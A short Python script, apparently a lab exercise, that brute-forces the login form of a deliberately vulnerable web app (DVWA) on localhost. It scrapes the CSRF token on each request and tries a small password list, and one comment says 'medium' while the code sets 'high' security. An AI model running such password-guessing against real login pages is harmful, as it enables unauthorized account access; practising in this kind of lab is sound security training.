
passwords = [
    "test",
    "admin",
    "test1",
    "test2",
    "password",
    "123456",
    "letmein"
]

def attempt_login(password):
    import requests
    import re

    BASE_URL = "http://localhost:8000"
    LOGIN_URL = f"{BASE_URL}/login.php"
    SECURITY_URL = f"{BASE_URL}/security.php"
    BRUTE_URL = f"{BASE_URL}/vulnerabilities/brute/"

    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"
    })

    # ===== LOGIN =====
    r = session.get(LOGIN_URL)

    token = re.search(
        r"name=['\"]user_token['\"]\s+value=['\"]([^'\"]+)['\"]",
        r.text
    ).group(1)

    session.post(LOGIN_URL, data={
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": token
    })

    # ===== SET SECURITY TO MEDIUM =====
    r = session.get(SECURITY_URL)

    sec_token = re.search(
        r"name=['\"]user_token['\"]\s+value=['\"]([^'\"]+)['\"]",
        r.text
    ).group(1)

    session.post(SECURITY_URL, data={
        "security": "high",
        "seclev_submit": "Submit",
        "user_token": sec_token
    })

    # ===== ACCESS BRUTE PAGE (GET CSRF TOKEN) =====
    r = session.get(BRUTE_URL)

    brute_token = re.search(
        r"name=['\"]user_token['\"]\s+value=['\"]([^'\"]+)['\"]",
        r.text
    ).group(1)

    # ===== BRUTE FORCE ATTEMPT WITH CSRF =====
    r = session.get(BRUTE_URL, params={
        "username": "admin",
        "password": password,
        "Login": "Login",
        "user_token": brute_token
    })


    return r.text

for pwd in passwords:
    print(f"[*] Trying password: {pwd}")

    response = attempt_login(pwd)

    if "Welcome to the password protected area" in response:
        print(f"[+] SUCCESS! Password found: {pwd}")
        break
    else:
        print("[-] Failed")
